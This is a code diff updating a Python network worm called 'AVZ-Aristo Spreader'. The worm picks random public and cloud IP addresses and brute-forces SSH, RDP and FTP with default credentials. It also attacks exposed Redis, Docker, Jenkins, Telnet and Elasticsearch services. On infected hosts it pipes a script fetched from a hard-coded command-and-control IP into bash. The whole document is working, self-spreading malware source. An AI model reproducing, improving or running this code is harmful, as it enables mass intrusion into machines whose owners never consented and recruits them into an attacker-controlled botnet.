@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v25.10.7 – случайные IP каждый цикл, детальный лог SSH, Redis/Docker
+# AVZ-Aristo Spreader v25.10.8 – полный, без сокращений
 import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging
 
 if sys.platform != 'win32':
@@ -15,13 +15,12 @@ C2_HOST = "80.249.146.202"
 C2_PORT = 80
 API_PORT = 8080
 AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
-MAX_CONCURRENT = 400
-QUICK_TIMEOUT = 0.5
+MAX_CONCURRENT = 500
+QUICK_TIMEOUT = 1.2
 BRUTE_TIMEOUT = 2.0
 DEFAULT_SCAN_COUNT = 20_000
-PORT_LIST = [21, 22, 23, 80, 443, 2375, 3389, 6379, 8080, 9200]
+PORT_LIST = [21, 22, 23, 80, 443, 2375, 3306, 3389, 445, 6379, 8080, 9200]
 
-# Расширенные учётные данные (часто встречающиеся)
 CREDS = [
     ("root","root"), ("root","admin"), ("root","password"), ("root","123456"), ("root","1234"),
     ("admin","admin"), ("admin","password"), ("admin","123456"),
@@ -29,8 +28,21 @@ CREDS = [
     ("test","test"), ("guest","guest"), ("pi","raspberry"), ("root",""), ("admin","")
 ]
 
+TOP_RANGES = [
+    "8.0.0.0/8", "13.0.0.0/8", "34.0.0.0/8", "35.0.0.0/8", "45.0.0.0/8",
+    "52.0.0.0/8", "54.0.0.0/8", "64.0.0.0/8", "74.0.0.0/8", "104.0.0.0/8",
+    "136.0.0.0/8", "142.0.0.0/8", "152.0.0.0/8", "172.0.0.0/8", "185.0.0.0/8"
+]
+
 def random_ip():
-    """Генерирует случайный IPv4, исключая приватные, loopback и multicast."""
+    if random.random() < 0.7:
+        r = random.choice(TOP_RANGES)
+        net, mask = r.split("/")
+        octets = list(map(int, net.split(".")))
+        host = random.randint(0, (1 << (32 - int(mask))) - 1)
+        for i in range(4):
+            octets[i] |= (host >> (8*(3-i))) & 0xFF
+        return ".".join(map(str, octets))
     while True:
         a = random.randint(1, 223)
         b = random.randint(0, 255)
@@ -56,7 +68,7 @@ async def ssh_brute(ip):
     print(f"[SSH] Попытка {ip}", flush=True)
     try:
         import asyncssh
-        for u, p in CREDS[:10]:  # первые 10
+        for u, p in CREDS[:10]:
             try:
                 async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=3) as conn:
                     await conn.run(f"wget -O- {AGENT_URL} | bash")
@@ -216,28 +228,28 @@ async def infect(ip, port_stats):
     for i, p in enumerate(ports):
         if open_ports[i]:
             port_stats[p] = port_stats.get(p, 0) + 1
-    if open_ports[2] and await ssh_brute(ip):
+    if open_ports[2] and await ssh_brute(ip):   # SSH
         print(f"[INFECTED] {ip} via SSH", flush=True)
         return True
-    if open_ports[6] and await rdp_brute(ip):
+    if open_ports[7] and await rdp_brute(ip):   # RDP
         print(f"[INFECTED] {ip} via RDP", flush=True)
         return True
-    if open_ports[0] and await ftp_brute(ip):
+    if open_ports[0] and await ftp_brute(ip):   # FTP
         print(f"[INFECTED] {ip} via FTP", flush=True)
         return True
-    if open_ports[7] and await exploit_redis(ip):
+    if open_ports[9] and await exploit_redis(ip): # Redis
         print(f"[INFECTED] {ip} via Redis", flush=True)
         return True
-    if open_ports[5] and await exploit_docker(ip):
+    if open_ports[5] and await exploit_docker(ip): # Docker
         print(f"[INFECTED] {ip} via Docker", flush=True)
         return True
-    if open_ports[8] and await exploit_jenkins(ip):
+    if open_ports[10] and await exploit_jenkins(ip): # Jenkins
         print(f"[INFECTED] {ip} via Jenkins", flush=True)
         return True
-    if open_ports[3] and await exploit_telnet(ip):
+    if open_ports[3] and await exploit_telnet(ip): # Telnet
         print(f"[INFECTED] {ip} via Telnet", flush=True)
         return True
-    if open_ports[9] and await exploit_elasticsearch(ip):
+    if open_ports[11] and await exploit_elasticsearch(ip): # Elasticsearch
         print(f"[INFECTED] {ip} via Elasticsearch", flush=True)
         return True
     if open_ports[4] or open_ports[5]:
@@ -246,7 +258,6 @@ async def infect(ip, port_stats):
             return True
     return False
 
-# worker, scan_cycle, global_scan, main_async, main – без изменений, см. предыдущий полный код
 async def worker(queue, stats, port_stats, progress_cb=None):
     while True:
         ip = await queue.get()
@@ -293,6 +304,14 @@ async def local_scan(progress_callback=None):
     print(f"[*] Scanning local network, {len(ips)} hosts", flush=True)
     return await scan_cycle(ips, progress_callback)
 
+def get_local_ips():
+    try:
+        local_ip = socket.gethostbyname(socket.gethostname())
+    except:
+        return []
+    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
+    return [str(host) for host in network.hosts() if str(host) != local_ip]
+
 async def main_async(args):
     print("[*] Checking C2 connection...", flush=True)
     try:
@@ -332,7 +351,6 @@ def main():
     group.add_argument('--count', type=int, default=DEFAULT_SCAN_COUNT)
     group.add_argument('--local', action='store_true')
     args = parser.parse_args()
-
     try:
         asyncio.run(main_async(args))
     except KeyboardInterrupt:
